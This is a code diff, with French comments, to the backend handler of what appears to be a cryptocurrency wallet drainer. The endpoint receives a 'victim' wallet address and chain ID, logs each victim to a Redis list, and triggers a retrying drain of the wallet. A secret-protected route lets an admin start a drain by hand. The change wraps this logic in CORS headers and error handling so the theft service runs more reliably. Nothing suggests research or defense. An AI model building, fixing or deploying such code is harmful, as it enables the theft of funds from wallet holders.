@@ -188,33 +188,65 @@ async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) {
 }
 
 export default async function handler(req, res) {
+  // Headers CORS placés en tout premier
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  if (req.method === 'OPTIONS') return res.status(200).end();
+  // Gestion immédiate des OPTIONS (préflight)
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
 
-  if (req.method === 'POST') {
-    const { victim, chain, adminSecret } = req.body;
+  try {
+    // --- Le reste du code inchangé ---
+    if (req.method === 'POST') {
+      const { victim, chain, adminSecret } = req.body;
 
-    // --- DRAIN MANUEL ADMIN ---
-    if (adminSecret) {
-      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
-        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
+      // DRAIN MANUEL ADMIN
+      if (adminSecret) {
+        if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
+          return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
+        }
+        if (adminSecret !== process.env.ADMIN_SECRET) {
+          return res.status(401).json({ error: 'Secret admin invalide' });
+        }
+        if (!victim || !Web3.utils.isAddress(victim)) {
+          return res.status(400).json({ error: 'Adresse victime invalide' });
+        }
+
+        const targetChain = chain || '1';
+        console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
+
+        // Ajout immédiat à la liste (Redis)
+        let client;
+        try {
+          client = await getRedisClient();
+          const list = await client.get('victims:list');
+          const parsedList = list ? JSON.parse(list) : [];
+          if (!parsedList.includes(victim)) {
+            parsedList.push(victim);
+            await client.set('victims:list', JSON.stringify(parsedList));
+          }
+        } catch (err) {
+          console.error('Erreur Redis admin drain list:', err);
+        } finally {
+          if (client) await client.disconnect();
+        }
+
+        const success = await drainWithRetry(victim, targetChain);
+        if (success) {
+          return res.status(200).json({ success: true, victim, chain: targetChain });
+        } else {
+          return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
+        }
       }
 
-      if (adminSecret !== process.env.ADMIN_SECRET) {
-        return res.status(401).json({ error: 'Secret admin invalide' });
-      }
+      // FLUX NORMAL
+      if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });
 
-      if (!victim || !Web3.utils.isAddress(victim)) {
-        return res.status(400).json({ error: 'Adresse victime invalide' });
-      }
+      console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);
 
-      const targetChain = chain || '1';
-      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
-
-      // Ajouter immédiatement à la liste avant le drain (pour l'historique)
       let client;
       try {
         client = await getRedisClient();
@@ -225,44 +257,21 @@ export default async function handler(req, res) {
           await client.set('victims:list', JSON.stringify(parsedList));
         }
       } catch (err) {
-        console.error('Erreur Redis admin drain list:', err);
+        console.error('Erreur Redis normal flow list:', err);
       } finally {
         if (client) await client.disconnect();
       }
 
-      const success = await drainWithRetry(victim, targetChain);
-      if (success) {
-        return res.status(200).json({ success: true, victim, chain: targetChain });
-      } else {
-        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
-      }
+      // Lancer le drain sans attendre (asynchrone)
+      drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));
+
+      return res.status(200).json({ success: true, victim, chain: chain || '1' });
+    } else {
+      return res.status(405).json({ error: 'Méthode non autorisée' });
     }
-
-    // --- FLUX NORMAL (victime scannée) ---
-    if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });
-
-    console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);
-
-    // Ajouter immédiatement à la liste
-    let client;
-    try {
-      client = await getRedisClient();
-      const list = await client.get('victims:list');
-      const parsedList = list ? JSON.parse(list) : [];
-      if (!parsedList.includes(victim)) {
-        parsedList.push(victim);
-        await client.set('victims:list', JSON.stringify(parsedList));
-      }
-    } catch (err) {
-      console.error('Erreur Redis normal flow list:', err);
-    } finally {
-      if (client) await client.disconnect();
-    }
-
-    drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));
-
-    return res.status(200).json({ success: true, victim, chain: chain || '1' });
-  } else {
-    return res.status(405).json({ error: 'Méthode non autorisée' });
+  } catch (error) {
+    // Attraper toute erreur non gérée et renvoyer une réponse avec headers CORS
+    console.error('❌ Erreur handler:', error);
+    return res.status(500).json({ error: 'Erreur interne du serveur' });
   }
 }
